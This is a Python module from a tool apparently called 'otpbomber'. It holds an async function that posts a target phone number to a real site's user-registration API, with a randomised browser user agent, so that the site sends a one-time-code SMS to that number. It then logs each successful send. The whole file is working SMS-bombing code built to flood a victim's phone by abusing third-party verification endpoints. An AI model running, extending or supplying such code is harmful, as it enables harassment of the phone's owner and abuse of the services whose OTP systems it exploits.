from otpbomber.core import *
from otpbomber.localuseragent import *
from requests_toolbelt.multipart.encoder import MultipartEncoder
import httpx

async def fixdar(phone, client, out):
    name = "fixdar"
    domain = "fixdar"
    frequent_rate_limit = False

    headers = {
        'Origin': 'https://www.fixdar.com',
        'Referer': 'https://www.fixdar.com/',

        'User-Agent': random.choice(ua["browsers"]["chrome"]),
      
    }

    # Define the multipart form data and get the raw bytes
    m = MultipartEncoder(
        fields={
            'phone_number': str(phone),  # International format
        }
    )
    headers['Content-Type'] = m.content_type
    data = m.to_string()  # Convert to raw bytes

    # Make the async post request
    try:
        async with httpx.AsyncClient() as client:
            response = await client.post('https://foreefix.com/foreefix-api/api/web_user_register', headers=headers, content=data)
        
        # Process the JSON response
        data = response.json()
        if data.get('message') == "code generated":
            out.append({"name": name, "domain": domain, "frequent_rate_limit": frequent_rate_limit, "rateLimit": False, "sent": True, "error": False})
        else:
            out.append({"name": name, "domain": domain, "frequent_rate_limit": frequent_rate_limit, "rateLimit": False, "sent": False, "error": True})

    except Exception as e:
        print(f"Error: {e}")
        out.append({"name": name, "domain": domain, "frequent_rate_limit": frequent_rate_limit, "rateLimit": False, "sent": False, "error": True})
